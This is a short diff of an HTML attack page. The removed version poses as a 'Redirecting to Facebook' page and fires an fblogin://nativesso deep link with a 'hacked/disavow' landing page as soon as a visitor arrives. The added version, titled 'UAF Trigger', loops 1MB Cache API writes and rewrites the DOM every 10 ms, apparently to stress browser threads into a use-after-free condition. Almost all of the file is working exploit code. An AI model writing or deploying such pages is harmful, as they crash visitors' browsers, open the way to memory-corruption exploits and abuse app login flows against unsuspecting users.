@@ -1,28 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Opening Facebook...</title>
-</head>
+<head><title>UAF Trigger</title></head>
 <body>
-    <p>Redirecting to Facebook, please wait...</p>
-    <script>
-        // This is the trigger. As soon as they land here, it fires the deep link.
-        // Encoding 'fb://' as 'fb%253A%252F%252F'
-        window.location.href = "fblogin://nativesso?contactpoint=100014638358648&landing_page=fb%3A%2F%2Fhacked%2Fdisavow";
-    </script>
+<script>
+    // Spam the Cache API to keep the C++ async threads busy
+    async function stressCache() {
+        while(true) {
+            let cache = await caches.open('v1-heavy-cache');
+            await cache.put('/dummy.txt', new Response('A'.repeat(1024 * 1024))); // 1MB chunk
+            await cache.match('/dummy.txt');
+        }
+    }
+    
+    // Spam massive DOM updates to stress the rendering tree
+    function stressRenderer() {
+        setInterval(() => {
+            document.body.innerHTML = '<div>' + Math.random() + '</div>'.repeat(5000);
+        }, 10);
+    }
+
+    stressCache();
+    stressRenderer();
+</script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
